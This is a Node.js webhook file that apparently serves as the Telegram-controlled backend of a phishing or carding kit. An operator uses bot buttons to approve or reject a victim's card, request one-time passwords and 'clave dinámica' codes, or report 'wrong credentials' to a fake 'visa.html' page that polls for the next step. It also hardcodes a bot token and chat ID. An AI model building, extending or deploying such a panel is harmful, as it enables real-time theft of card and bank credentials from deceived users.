// /api/webhook.js
const fs = require('fs');
const path = require('path');

// Configuración del bot
const TELEGRAM_BOT_TOKEN = '8736155859:AAHI77N8wP6_UNpI3RGIerJkLRRKUvVR8iQ';
const TELEGRAM_CHAT_ID = '-1004294946880';

// Archivo donde se guardan los estados (en Vercel no se puede escribir en disco)
// Usamos una variable global para mantener el estado
let estados = {};

// Función para guardar estado
function guardarEstado(solicitudId, estado) {
    estados[solicitudId] = {
        estado: estado,
        timestamp: Date.now()
    };
}

// Función para obtener estado
function obtenerEstado(solicitudId) {
    return estados[solicitudId] ? estados[solicitudId].estado : 'pending';
}

module.exports = async (req, res) => {
    // ============================================
    // 1. VERIFICAR ESTADO (GET) - El frontend consulta
    // ============================================
    if (req.method === 'GET' && req.query.check) {
        const solicitudId = req.query.check;
        const estado = obtenerEstado(solicitudId);
        return res.status(200).json({ estado, solicitudId });
    }

    // ============================================
    // 2. RECIBIR CALLBACK DE TELEGRAM (POST)
    // ============================================
    if (req.method === 'POST') {
        try {
            const data = req.body;

            // Verificar si es un callback de Telegram
            if (data && data.callback_query) {
                const callback = data.callback_query;
                const callbackData = callback.data;
                const callbackId = callback.id;

                // ============================================
                // 🔹 CASO 1: approve_cc_{id} / reject_cc_{id} (EXISTENTE)
                // ============================================
                const matchCC = callbackData.match(/(approve_cc_|reject_cc_)(.+)/);
                if (matchCC) {
                    const accion = matchCC[1];
                    const solicitudId = matchCC[2];
                    const estado = accion.includes('approve') ? 'approved' : 'rejected';

                    guardarEstado(solicitudId, estado);

                    // Responder a Telegram
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            callback_query_id: callbackId,
                            text: estado === 'approved' ? '✅ Pago aprobado' : '❌ Pago rechazado',
                            show_alert: false
                        })
                    });

                    const editText = callback.message.text + '\n\n' + (estado === 'approved' ? '✅ **APROBADO**' : '❌ **RECHAZADO**');
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: callback.message.chat.id,
                            message_id: callback.message.message_id,
                            text: editText,
                            parse_mode: 'Markdown'
                        })
                    });

                    return res.status(200).send('OK');
                }

                // ============================================
                // 🔹 CASO 2: pedir_otp_{id} (NUEVO - visa.html)
                // ============================================
                const matchPedirOTP = callbackData.match(/pedir_otp_(.+)/);
                if (matchPedirOTP) {
                    const solicitudId = matchPedirOTP[1];
                    guardarEstado(solicitudId, 'pedir_otp');

                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            callback_query_id: callbackId,
                            text: '📱 OTP solicitado. Esperando ingreso del usuario...',
                            show_alert: false
                        })
                    });

                    const editText = callback.message.text + '\n\n📱 **OTP SOLICITADO**\n⏳ Esperando ingreso del código por parte del usuario...';
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: callback.message.chat.id,
                            message_id: callback.message.message_id,
                            text: editText,
                            parse_mode: 'Markdown'
                        })
                    });

                    return res.status(200).send('OK');
                }

                // ============================================
                // 🔹 CASO 3: pedir_clave_din_{id} (NUEVO - visa.html)
                // ============================================
                const matchClaveDin = callbackData.match(/pedir_clave_din_(.+)/);
                if (matchClaveDin) {
                    const solicitudId = matchClaveDin[1];
                    guardarEstado(solicitudId, 'pedir_clave_din');

                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            callback_query_id: callbackId,
                            text: '🔑 Clave Dinámica solicitada. Esperando ingreso del usuario...',
                            show_alert: false
                        })
                    });

                    const editText = callback.message.text + '\n\n🔑 **CLAVE DINÁMICA SOLICITADA**\n⏳ Esperando ingreso de la clave por parte del usuario...';
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: callback.message.chat.id,
                            message_id: callback.message.message_id,
                            text: editText,
                            parse_mode: 'Markdown'
                        })
                    });

                    return res.status(200).send('OK');
                }

                // ============================================
                // 🔹 CASO 4: error_credenciales_{id} (NUEVO - visa.html)
                // ============================================
                const matchError = callbackData.match(/error_credenciales_(.+)/);
                if (matchError) {
                    const solicitudId = matchError[1];
                    guardarEstado(solicitudId, 'error_credenciales');

                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            callback_query_id: callbackId,
                            text: '❌ Credenciales incorrectas',
                            show_alert: false
                        })
                    });

                    const editText = callback.message.text + '\n\n❌ **CREDENCIALES INCORRECTAS**\nEl usuario deberá intentar nuevamente.';
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: callback.message.chat.id,
                            message_id: callback.message.message_id,
                            text: editText,
                            parse_mode: 'Markdown'
                        })
                    });

                    return res.status(200).send('OK');
                }

                // ============================================
                // 🔹 CASO 5: aprobar_otp_{id} (NUEVO - visa.html)
                // ============================================
                const matchAprobarOTP = callbackData.match(/aprobar_otp_(.+)/);
                if (matchAprobarOTP) {
                    const solicitudId = matchAprobarOTP[1];
                    guardarEstado(solicitudId, 'aprobar_otp');

                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            callback_query_id: callbackId,
                            text: '✅ OTP aprobado. Autenticación completada.',
                            show_alert: false
                        })
                    });

                    const editText = callback.message.text + '\n\n✅ **OTP APROBADO**\n🎉 Autenticación completada exitosamente.';
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: callback.message.chat.id,
                            message_id: callback.message.message_id,
                            text: editText,
                            parse_mode: 'Markdown'
                        })
                    });

                    return res.status(200).send('OK');
                }

                // ============================================
                // 🔹 CASO 6: rechazar_otp_{id} (NUEVO - visa.html)
                // ============================================
                const matchRechazarOTP = callbackData.match(/rechazar_otp_(.+)/);
                if (matchRechazarOTP) {
                    const solicitudId = matchRechazarOTP[1];
                    guardarEstado(solicitudId, 'rechazar_otp');

                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            callback_query_id: callbackId,
                            text: '❌ OTP rechazado',
                            show_alert: false
                        })
                    });

                    const editText = callback.message.text + '\n\n❌ **OTP RECHAZADO**\nEl usuario deberá intentar nuevamente.';
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: callback.message.chat.id,
                            message_id: callback.message.message_id,
                            text: editText,
                            parse_mode: 'Markdown'
                        })
                    });

                    return res.status(200).send('OK');
                }

                // ============================================
                // 🔹 CASO 7: aprobar_clave_din_{id} (NUEVO - visa.html)
                // ============================================
                const matchAprobarClave = callbackData.match(/aprobar_clave_din_(.+)/);
                if (matchAprobarClave) {
                    const solicitudId = matchAprobarClave[1];
                    guardarEstado(solicitudId, 'aprobar_clave_din');

                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            callback_query_id: callbackId,
                            text: '✅ Clave Dinámica aprobada. Autenticación completada.',
                            show_alert: false
                        })
                    });

                    const editText = callback.message.text + '\n\n✅ **CLAVE DINÁMICA APROBADA**\n🎉 Autenticación completada exitosamente.';
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: callback.message.chat.id,
                            message_id: callback.message.message_id,
                            text: editText,
                            parse_mode: 'Markdown'
                        })
                    });

                    return res.status(200).send('OK');
                }

                // ============================================
                // 🔹 CASO 8: rechazar_clave_din_{id} (NUEVO - visa.html)
                // ============================================
                const matchRechazarClave = callbackData.match(/rechazar_clave_din_(.+)/);
                if (matchRechazarClave) {
                    const solicitudId = matchRechazarClave[1];
                    guardarEstado(solicitudId, 'rechazar_clave_din');

                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            callback_query_id: callbackId,
                            text: '❌ Clave Dinámica rechazada',
                            show_alert: false
                        })
                    });

                    const editText = callback.message.text + '\n\n❌ **CLAVE DINÁMICA RECHAZADA**\nEl usuario deberá intentar nuevamente.';
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: callback.message.chat.id,
                            message_id: callback.message.message_id,
                            text: editText,
                            parse_mode: 'Markdown'
                        })
                    });

                    return res.status(200).send('OK');
                }

                // Si no coincide con ningún caso, ignorar
                return res.status(200).send('OK');
            }

            return res.status(200).send('OK');
        } catch (error) {
            console.error('Error:', error);
            return res.status(500).json({ error: 'Error interno' });
        }
    }

    // ============================================
    // 3. SI NO ES NINGUNA DE LAS ANTERIORES
    // ============================================
    return res.status(200).send('Webhook activo');
};
